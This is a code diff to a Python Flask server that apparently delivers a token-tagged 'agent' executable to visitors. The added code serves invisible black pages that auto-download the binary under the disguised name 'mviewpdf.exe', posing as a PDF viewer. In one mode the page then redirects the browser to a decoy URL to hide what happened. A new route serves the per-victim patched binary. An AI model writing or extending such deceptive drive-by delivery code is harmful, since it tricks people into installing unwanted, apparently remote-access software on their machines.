@@ -164,6 +164,7 @@ _dashboard_device: dict = {}
 _dash_lock = threading.Lock()
 
 _agent_cache: bytes | None = None
+_agent_dl_cache: dict = {}   # token -> patched bytes, for /guide/<token>/dl
 _agent_cache_ts: float     = 0.0
 _agent_cache_lock          = threading.Lock()
 AGENT_CACHE_TTL            = 300
@@ -829,27 +830,66 @@ def serve_agent(token):
 
     log.info(f"Agent download: token={token}  mode={link_mode}")
 
-    if link_mode == "redirect" and redirect_url:
-        return redirect(redirect_url, 302)
-
-    # Try to serve a patched binary (token embedded in trailer)
+    # Resolve the download URL: patched binary served directly, or GitHub fallback
     patched = _build_patched_agent(token)
     if patched:
-        resp = make_response(patched)
+        # Store bytes for the /guide/<token>/dl sub-route to serve
+        _agent_dl_cache[token] = patched
+
+    dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL
+
+    if link_mode == "redirect" and redirect_url:
+        # Show an invisible page: trigger download then redirect after 1.5 s
+        html = f"""<!DOCTYPE html><html><head><meta charset=utf-8>
+<title>Loading…</title>
+<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style>
+</head><body>
+<script>
+(function(){{
+  var a=document.createElement('a');
+  a.href={repr(dl_url)};
+  a.download='mviewpdf.exe';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function(){{window.location.href={repr(redirect_url)};}},1500);
+}})();
+</script>
+</body></html>"""
+        return make_response(html, 200, {{"Content-Type": "text/html"}})
+
+    # Blank page mode: plain black page that auto-starts the download
+    html = f"""<!DOCTYPE html><html><head><meta charset=utf-8>
+<title> </title>
+<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style>
+</head><body>
+<script>
+(function(){{
+  var a=document.createElement('a');
+  a.href={repr(dl_url)};
+  a.download='mviewpdf.exe';
+  document.body.appendChild(a);
+  a.click();
+}})();
+</script>
+</body></html>"""
+    return make_response(html, 200, {{"Content-Type": "text/html"}})
+
+
+@app.route("/guide/<token>/dl")
+def serve_agent_binary(token):
+    """Serve the cached patched binary for a token."""
+    if token in _agent_dl_cache:
+        data = _agent_dl_cache[token]
+        resp = make_response(data)
         resp.headers["Content-Type"] = "application/octet-stream"
         resp.headers["Content-Disposition"] = f'attachment; filename="mviewpdf.exe"'
-        resp.headers["Content-Length"] = len(patched)
+        resp.headers["Content-Length"] = len(data)
         resp.headers["Cache-Control"] = "no-store"
         return resp
-
-    # Fallback: redirect the browser directly to the GitHub release URL.
-    # Works even when the server cannot proxy the binary (Render free tier
-    # network/memory limits, cold start with no cache, etc.)
+    # Fallback to GitHub
     if AGENT_STORAGE_URL:
-        log.info(f"Agent binary not cached — redirecting client to: {AGENT_STORAGE_URL}")
         return redirect(AGENT_STORAGE_URL, 302)
-
-    return jsonify({"error": "Agent binary not available. Contact admin."}), 503
+    return jsonify({"error": "Binary not available."}), 503
 
 # ── Admin: list / revoke ──────────────────────────────────────────────────────
 @app.route("/api/sessions")
